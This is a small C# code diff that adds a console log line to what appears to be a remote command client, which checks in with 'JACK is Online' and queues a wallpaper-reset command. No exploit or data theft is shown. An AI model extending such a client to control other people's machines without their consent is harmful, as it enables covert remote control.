@@ -72,6 +72,7 @@ namespace Payload.Command.SocketClient
             {
                 ReTry = false;
                 client.EmitAsync("message", "JACK is Online").Wait();
+                Console.WriteLine(DateTime.Now.ToLongTimeString() + " :: CONNECTED SERVER");
                 CommandManager.Instance.AddWallpaperCmd(WallPaper.Mode.RESET);
             }
             catch
